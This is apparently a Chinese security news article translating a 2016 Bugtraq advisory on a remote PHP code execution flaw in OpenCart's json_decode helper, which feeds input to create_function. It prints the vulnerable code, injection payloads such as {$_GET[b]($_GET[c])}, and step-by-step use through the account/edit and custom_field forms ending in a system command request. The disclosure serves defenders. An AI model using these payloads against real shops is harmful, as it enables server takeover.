# OpenCart json_decode函数中存在远程PHP代码执行漏洞

阅读量 **226865**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-04-12 14:12:56

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<http://seclists.org/bugtraq/2016/Apr/61>

译文仅供参考，具体内容表达以及含义原文为准。

最近,安全研究人员Naser Farhadi(Twitter: @naserfarhadi)发现OpenCart
json_decode函数中存在远程PHP代码执行漏洞,涉及到的版本有2.1.0.2 到 2.2.0.0 (最新版本)

漏洞存在于 /upload/system/helper/json.php中,其中有这段代码

    
    
    # /upload/system/helper/json.php
    $match = '/".*?(?<!\\)"/';
    $string = preg_replace($match, '', $json);
    $string = preg_replace('/[,:{}[]0-9.-+Eaeflnr-u nrt]/', '', $string);
    ...
    $function = @create_function('', "return {$json};"); /**** 万恶之源 ****/
    $return = ($function) ? $function() : null;
    ...
    return $return;

其中通过json进行了函数的创建,而json_decode函数可被利用

这里是几个简单的测试例子

var_dump(json_decode('{"ok":"1"."2"."3"}'));

var_dump(json_decode('{"ok":"$_SERVER[HTTP_USER_AGENT]"}'));

var_dump(json_decode('{"ok":"{$_GET[b]($_GET[c])}"}'));

在真实场景中,可以通过/index.php?route=account/edit进行利用

例如将$_SERVER[HTTP_USER_AGENT]作为姓名填写进去,保存(需要重复两次)

之后当管理员访问管理面板时,他会在最近活动中本应显示你的姓名的地方看到他自己的UserAgent

另一个例子是在account/edit 或者 account/register 中的 custom_field ,在这里进行利用可能是最合适的

如果管理员在/admin/index.php?route=customer/custom_field中添加了一个自定义的区域用于电话号码之类的额外信息

你就可以直接注入你的代码在这个custom_field中

例如将{$_GET[b]($_GET[c])}填写到这个custom_field中,保存

然后访问

[http://host/shop_directory/index.php?route=account/edit&b=system&c=ls](http://host/shop_directory/index.php?route=account/edit&b=system&c=ls)

你会看到代码被正确执行了

需要注意的是,这种利用方式只会在 PHP JSON扩展没有安装的情况下有效

本文翻译自360安全播报 [原文链接](http://seclists.org/bugtraq/2016/Apr/61)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **暗羽喵** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83757](/post/id/83757)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](http://seclists.org/bugtraq/2016/Apr/61)

如若转载,请注明出处： <http://seclists.org/bugtraq/2016/Apr/61>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t0105458eb30ea90c88.jpg) 暗羽喵

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

